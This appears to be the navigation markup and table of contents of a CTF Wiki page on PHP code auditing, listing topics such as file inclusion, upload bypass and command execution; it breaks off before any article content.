



<!DOCTYPE html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/web/php/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.3, mkdocs-material-2.7.3">
    
    
      
        <title>PHP 代码审计 - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.8d40d89b.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.6079476c.css">
      
    
    
      <script src="../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
      <link rel="stylesheet" href="../../_static/css/extra.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#_1" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                CTF Wiki
              </span>
              <span class="md-header-nav__topic">
                PHP 代码审计
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  


  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      ctf-wiki/ctf-wiki
    </div>
  </a>

          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../.." title="Introduction" class="md-tabs__link">
          Introduction
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../misc/introduction/" title="Misc" class="md-tabs__link">
          Misc
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../crypto/introduction/" title="Crypto" class="md-tabs__link">
          Crypto
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../introduction/" title="Web" class="md-tabs__link md-tabs__link--active">
          Web
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../reverse/introduction/" title="Reverse" class="md-tabs__link">
          Reverse
        </a>
      
    </li>
  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../pwn/stackoverflow/stack_intro/" title="Pwn" class="md-tabs__link">
          Pwn
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../executable/elf/elf_structure/" title="Executable" class="md-tabs__link">
          Executable
        </a>
      
    </li>
  

  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </span>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      


  


  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      ctf-wiki/ctf-wiki
    </div>
  </a>

    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../.." title="Getting Started" class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction/history/" title="CTF 历史" class="md-nav__link">
      CTF 历史
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction/mode/" title="CTF 竞赛模式简介" class="md-nav__link">
      CTF 竞赛模式简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction/content/" title="CTF 竞赛内容" class="md-nav__link">
      CTF 竞赛内容
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction/experience/" title="线下攻防经验小结" class="md-nav__link">
      线下攻防经验小结
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction/cgc/" title="CGC 超级挑战赛" class="md-nav__link">
      CGC 超级挑战赛
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction/resources/" title="学习资源" class="md-nav__link">
      学习资源
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/introduction/" title="杂项简介" class="md-nav__link">
      杂项简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/recon/" title="信息搜集技术" class="md-nav__link">
      信息搜集技术
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      编码分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        编码分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/encode/communication/" title="通信领域常用编码" class="md-nav__link">
      通信领域常用编码
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/encode/computer/" title="计算机相关的编码" class="md-nav__link">
      计算机相关的编码
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/encode/modern/" title="现实世界中常用的编码" class="md-nav__link">
      现实世界中常用的编码
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/prefix/" title="取证隐写前置技术" class="md-nav__link">
      取证隐写前置技术
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      图片分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        图片分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/picture/introduction/" title="图片分析简介" class="md-nav__link">
      图片分析简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/picture/png/" title="PNG" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/picture/jpg/" title="JPG" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/picture/gif/" title="GIF" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      流量包分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        流量包分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/traffic/introduction/" title="流量包分析简介" class="md-nav__link">
      流量包分析简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/traffic/fix/" title="PCAP 文件修复" class="md-nav__link">
      PCAP 文件修复
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/traffic/protocols/" title="协议分析" class="md-nav__link">
      协议分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/traffic/data/" title="数据提取" class="md-nav__link">
      数据提取
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      压缩包分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        压缩包分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/archive/zip/" title="ZIP 格式" class="md-nav__link">
      ZIP 格式
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/archive/rar/" title="RAR 格式" class="md-nav__link">
      RAR 格式
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/audio/introduction/" title="音频隐写" class="md-nav__link">
      音频隐写
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/disk-memory/introduction/" title="磁盘内存分析" class="md-nav__link">
      磁盘内存分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/other/pyc/" title="pyc文件" class="md-nav__link">
      pyc文件
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/introduction/" title="密码学简介" class="md-nav__link">
      密码学简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      古典密码
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        古典密码
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/classcial/introduction/" title="古典密码简介" class="md-nav__link">
      古典密码简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/classcial/monoalphabetic/" title="单表代换加密" class="md-nav__link">
      单表代换加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/classcial/polyalphabetic/" title="多表代换加密" class="md-nav__link">
      多表代换加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/classcial/others/" title="其他类型加密" class="md-nav__link">
      其他类型加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/classcial/summary/" title="总结" class="md-nav__link">
      总结
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      对称加密
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        对称加密
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/symmetric/introduction/" title="对称加密简介" class="md-nav__link">
      对称加密简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/symmetric/des/" title="DES" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/symmetric/aes/" title="AES" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/symmetric/simon-speck/" title="Simon and Speck" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/symmetric/block-cipher/" title="分组模式" class="md-nav__link">
      分组模式
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      非对称加密
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        非对称加密
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/introduction/" title="非对称加密简介" class="md-nav__link">
      非对称加密简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      RSA
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_theory/" title="RSA 基本介绍" class="md-nav__link">
      RSA 基本介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_module_attack/" title="模数相关攻击" class="md-nav__link">
      模数相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_e_attack/" title="公钥指数相关攻击" class="md-nav__link">
      公钥指数相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_d_attack/" title="私钥 d 相关攻击" class="md-nav__link">
      私钥 d 相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_chosen_cipher/" title="选择密文攻击" class="md-nav__link">
      选择密文攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" title="Coppersmith 相关攻击" class="md-nav__link">
      Coppersmith 相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_side_channel/" title="侧信道攻击" class="md-nav__link">
      侧信道攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_pkcs_attack/" title="Bleichenbacher 攻击" class="md-nav__link">
      Bleichenbacher 攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/rsa/rsa_complex/" title="综合" class="md-nav__link">
      综合
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/knapsack/knapsack/" title="背包加密" class="md-nav__link">
      背包加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/asymmetric/discrete-log/discrete-log/" title="离散对数相关" class="md-nav__link">
      离散对数相关
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      哈希函数
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        哈希函数
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/hash/introduction/" title="哈希函数简介" class="md-nav__link">
      哈希函数简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/hash/md5/" title="MD5" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/hash/sha1/" title="SHA1" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/hash/attack/" title="Hash Attack" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/hash/complex/" title="综合" class="md-nav__link">
      综合
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      数字签名
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        数字签名
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/signature/introduction/" title="数字签名简介" class="md-nav__link">
      数字签名简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/signature/rsa/" title="RSA 数字签名" class="md-nav__link">
      RSA 数字签名
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/signature/elgamal/" title="ElGamal 数字签名" class="md-nav__link">
      ElGamal 数字签名
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/signature/dsa/" title="DSA 数字签名" class="md-nav__link">
      DSA 数字签名
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      伪随机数
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        伪随机数
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/prng/introduction/" title="伪随机数生成器" class="md-nav__link">
      伪随机数生成器
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/prng/csprng/" title="密码学安全伪随机数生成器" class="md-nav__link">
      密码学安全伪随机数生成器
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/prng/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/certificate/introduction/" title="证书格式" class="md-nav__link">
      证书格式
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
    
    <label class="md-nav__link" for="nav-4">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../introduction/" title="Web 应用简介" class="md-nav__link">
      Web 应用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../sqli/" title="SQL 注入" class="md-nav__link">
      SQL 注入
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../xss/" title="XSS 跨站脚本攻击" class="md-nav__link">
      XSS 跨站脚本攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../csrf/" title="CSRF 跨站请求伪造" class="md-nav__link">
      CSRF 跨站请求伪造
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../ssrf/" title="SSRF 服务端请求伪造" class="md-nav__link">
      SSRF 服务端请求伪造
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        PHP 代码审计
      </label>
    
    <a href="./" title="PHP 代码审计" class="md-nav__link md-nav__link--active">
      PHP 代码审计
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="文件包含" class="md-nav__link">
    文件包含
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="本地文件包含" class="md-nav__link">
    本地文件包含
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="远程文件包含" class="md-nav__link">
    远程文件包含
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="文件上传" class="md-nav__link">
    文件上传
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="绕过上传检查" class="md-nav__link">
    绕过上传检查
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" title="变量覆盖" class="md-nav__link">
    变量覆盖
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" title="全局变量覆盖" class="md-nav__link">
    全局变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract" title="extract() 变量覆盖" class="md-nav__link">
    extract() 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#import_request_variables" title="import_request_variables 变量覆盖" class="md-nav__link">
    import_request_variables 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse_str" title="parse_str() 变量覆盖" class="md-nav__link">
    parse_str() 变量覆盖
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" title="命令执行" class="md-nav__link">
    命令执行
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="直接执行代码" class="md-nav__link">
    直接执行代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_replace" title="preg_replace() 代码执行" class="md-nav__link">
    preg_replace() 代码执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="动态函数执行" class="md-nav__link">
    动态函数执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="反引号命令执行" class="md-nav__link">
    反引号命令执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#curly-syntax" title="Curly Syntax" class="md-nav__link">
    Curly Syntax
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="回调函数" class="md-nav__link">
    回调函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="反序列化" class="md-nav__link">
    反序列化
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php" title="PHP 特性" class="md-nav__link">
    PHP 特性
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" title="数组" class="md-nav__link">
    数组
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash" title="魔法 Hash" class="md-nav__link">
    魔法 Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" title="十六进制转换" class="md-nav__link">
    十六进制转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" title="类型转换" class="md-nav__link">
    类型转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" title="内置函数的参数的松散性" class="md-nav__link">
    内置函数的参数的松散性
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
